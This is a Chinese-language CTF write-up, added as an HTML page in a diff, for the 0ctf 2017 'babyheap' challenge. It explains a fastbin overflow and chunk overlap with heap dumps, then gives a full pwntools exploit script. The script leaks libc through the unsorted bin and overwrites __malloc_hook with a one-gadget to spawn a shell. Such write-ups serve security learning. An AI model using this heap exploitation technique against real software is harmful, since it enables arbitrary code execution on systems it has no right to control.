@@ -1,0 +1,161 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>baby_heap_ctf0</title>
+</head>
+<body>
+<b>baby_heap_ctf0</b><br>
+<small>2025-03-20</small>
+<hr>
+<pre><code>add(0x10)
+add(0x10)
+add(0x10)
+add(0x10) #fastbin
+add(0x80) #unsorted_bin</code></pre>
+
+<pre><code>wndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x58b22aae7000
+Size: 0x290 (with flag bits: 0x291)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x58b22aae7290
+Size: 0x30 (with flag bits: 0x31)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x58b22aae72c0
+Size: 0x30 (with flag bits: 0x31)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x58b22aae72f0
+Size: 0x30 (with flag bits: 0x31)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x58b22aae7320
+Size: 0x30 (with flag bits: 0x31)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x58b22aae7350
+Size: 0x90 (with flag bits: 0x91)
+
+Top chunk | PREV_INUSE
+Addr: 0x58b22aae73e0
+Size: 0x20c20 (with flag bits: 0x20c21)</code></pre>
+
+<p>size 0x20 是因为size 和 prev_size 占0x10</p>
+<br><img src="/2025/03/20/baby-heap-ctf0/image-20250318203153611.png" width="200"><br>
+
+<p>free chunk1 和2 </p>
+<p>可以看到进入fastbins 里面了 chunk 2 fd 指 chunk1 LIFO 后入先出</p>
+<pre><code>payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21)
+payload +=p8(80)</code></pre>
+
+<p>从10开始溢出</p>
+<p>payload &#x3D; p64(0)*3  写chunk0 fd bk ,chunk1 prev size</p>
+<p>p64(0x21) chunk1 size</p>
+<p>*p64(0)*3 chunk1 fd bk,chunk2 prev size</p>
+<p>p64(0x21) chunk2 size<br>payload +&#x3D;p8(80) 到fd了 溢出改后面80 指出4号chunk</p>
+<br><img src="/2025/03/20/baby-heap-ctf0/image-20250319132808517.png" width="200"><br>
+
+<p>0x33 计算</p>
+<p>因为头部字段占0x21 </p>
+<br><img src="/2025/03/20/baby-heap-ctf0/image-20250319132839203.png" width="200"><br>
+
+<p>需要将第二个字段 错位成我们要的size 0x70-0x7f</p>
+<p>0x74ab97bc4b0d 数据区从这里开始</p>
+<p>0x74ab97bc4b10 这是libc_hook地址</p>
+<p>相减&#x3D;3 这就是说我们需要写三个垃圾就行</p>
+<pre><code>from pwn import *
+context.os=&#x27;linux&#x27;
+context.arch=&#x27;amd64&#x27;
+context.log_level=&#x27;debug&#x27;
+elf = ELF(&quot;./babyheap_0ctf_2017&quot;)
+p = process(&quot;./babyheap_0ctf_2017&quot;)
+libc = ELF(&quot;/home/rick/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)
+def debug():
+    attach(p)
+    pause()
+def allo(size):
+	p.recvuntil(&quot;Command: &quot;)
+	p.sendline(str(1))
+	p.recvuntil(&quot;Size: &quot;)
+	p.sendline(str(size))
+
+def fill(idx,size,content):
+	p.recvuntil(&quot;Command: &quot;)
+	p.sendline(str(2))
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;Size: &quot;)
+	p.sendline(str(size))
+	p.recvuntil(&quot;Content: &quot;)
+	p.sendline(content)
+
+def free(idx):
+	p.recvuntil(&quot;Command: &quot;)
+	p.sendline(str(3))
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+
+def dump(idx):
+	p.recvuntil(&quot;Command: &quot;)
+	p.sendline(str(4))
+	p.recvuntil(&quot;Index: &quot;)
+	p.sendline(str(idx))
+    
+
+allo(0x10)#0
+allo(0x10)#1
+allo(0x10)#2
+allo(0x10)#3
+allo(0x80)#4
+free(1)
+free(2)
+
+payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21)
+payload += p8(0x80) # 使2的chunk空闲块指向了4号块的位置,4号位为较大的chunk，用来获取目标地址
+fill(0,len(payload),payload)
+
+payload = p64(0)*3 + p64(0x21)
+fill(3,len(payload),payload) # 让4号块的大小变成0x21，这样4号块就意义上被free了
+
+allo(0x10)#1 The original position of 2 # 申请原本2号块
+allo(0x10)#2 4 Simultaneous pointing	# 这里就会申请到4号块的位置
+
+payload = p64(0)*3 + p64(0x91)
+fill(3,len(payload),payload) # 将4号块的大小改回 0x91,不然找不到top chunk位置
+
+allo(0x80) # 在申请一块大空间，避免4号块和top chunk合并
+
+free(4)    # 释放4号块
+
+dump(2)
+p.recvuntil(&#x27;Content: \n&#x27;)
+unsortedbin_addr = u64(p.recv(8).ljust(8,b&#x27;\0&#x27;))
+
+main_arena = unsortedbin_addr - 88
+_libc_hook = main_arena - 0x10
+local_libc_hook_addr = libc.sym[&quot;__malloc_hook&quot;]
+_libc_base_addr = _libc_hook - local_libc_hook_addr
+execve_addr = _libc_base_addr + 0x4527a
+fake_chunk_addr = main_arena -0x33 #错位成我们要的size 0x70-0x7f
+log.info(&quot;main_arena:&quot;+hex(main_arena))
+log.info(&quot;_libc_base_addr :&quot;+hex(_libc_base_addr))
+log.info(&quot;_libc_hook :&quot;+hex(_libc_hook))
+allo(0x60) # cut chunk -&gt; 0x60 fastbins -&gt; 0x20 unsortbins
+free(4)
+payload=p64(fake_chunk_addr) #overwrite idx2(0x20,unsortbin)fd
+fill(2,len(payload),payload)
+allo(0x60) #alloc free(4) chunk 0x60 -&gt; fastbin
+allo(0x60) #alloc fake chunk 
+payload=b&#x27;a&#x27;*(0x8+0x3+0x8) + p64(execve_addr) #0x8 fd 0x8 bk 0x3 错位恢复
+fill(6,len(payload),payload)
+allo(0x79)
+debug()
+p.interactive()</code></pre>
+
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
